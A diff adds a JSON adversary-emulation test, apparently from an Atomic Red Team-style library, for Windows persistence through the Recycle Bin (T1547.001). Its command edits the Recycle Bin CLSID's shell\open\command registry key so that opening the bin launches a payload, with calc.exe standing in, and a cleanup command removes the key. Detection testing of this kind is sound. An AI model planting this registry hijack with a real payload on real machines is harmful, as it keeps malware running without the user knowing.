@@ -1,0 +1,25 @@
+{
+    "name": "Add persistance via Recycle bin",
+    "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf) User have to clic on the recycle bin to lauch the payload (here calc) ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f",
+        "cleanup_command": "reg DELETE \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\" /f",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1547.001",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "Registry Run Keys / Startup Folder",
+    "source": "ART",
+    "uuid": "bda6a3d6-7aa7-4e89-908b-306772e9662f",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
